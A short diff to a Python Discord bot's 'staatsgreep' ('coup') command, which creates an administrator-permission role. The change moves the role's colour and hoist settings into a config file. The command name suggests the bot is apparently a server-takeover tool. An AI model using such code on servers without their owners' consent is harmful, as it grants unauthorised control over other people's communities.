@@ -116,8 +116,8 @@ async def staatsgreep(ctx):
         # Create a role (with admin permissions and a color)
         server = ctx.guild
         perms = discord.Permissions(administrator=True)
-        color = discord.Colour(0xB70EEB)
-        await server.create_role(name=pCconfig["make_new_role"]["name"], hoist=True, permissions=perms, colour=color)
+        color = discord.Colour(int(pCconfig["make_new_role"]["color"], 16))
+        await server.create_role(name=pCconfig["make_new_role"]["name"], hoist=pCconfig["make_new_role"]["hoist"], permissions=perms, colour=color)
 
         # Get role as object
         new_role = discord.utils.get(server.roles, name=pCconfig["make_new_role"]["name"])
